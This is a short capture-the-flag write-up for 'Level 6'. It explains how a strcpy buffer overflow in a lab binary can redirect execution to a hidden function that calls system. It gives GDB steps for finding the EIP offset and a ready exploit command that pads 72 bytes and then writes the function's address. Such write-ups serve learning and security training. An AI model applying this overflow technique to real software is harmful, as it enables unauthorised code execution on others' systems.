# LEVEL 6

## 💡 Explanation

In this level we have to:
1. Check the binary, as always! The main calls `strcpy` and then it calls the function `m`. Same as the in the level1, inside of the binary we can also find a function `n` which contains a call to `system` but it is not called on the main.
2. We are going to exploit the call to `strcpy` to place the address of the function `n` on the eip. It is a buffer overflow similar to the level1 but instead of exploiting a `gets` we will have to pass as an argument the string that is going to overflow.
3. To build the exploit we will have to find out what if the offset of the EIP and then place the address of `n`: [RANDOM CHARS UNTIL EIP][ADDRESS N]

## 👾 Commands

To find the solution:
```
[GDB] pattern create 200 => Stopped reason: SIGSEGV || <ADDRESS> in ?? ()
[GDB] pattern offset <ADDRESS> => Gives the offset of EIP
[GDB] disas n
```

To execute the solution:
- `/home/user/level6/level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`

## 🔍 Resources

- [Function C - strcpy](https://koor.fr/C/cstring/strcpy.wp)
- [Exploring Buffer Overflows in C, Part Two: The Exploit](https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/)
- [Buffer Overflow using strcpy()](https://shankaraman.wordpress.com/tag/how-to-exploit-strcpy/)
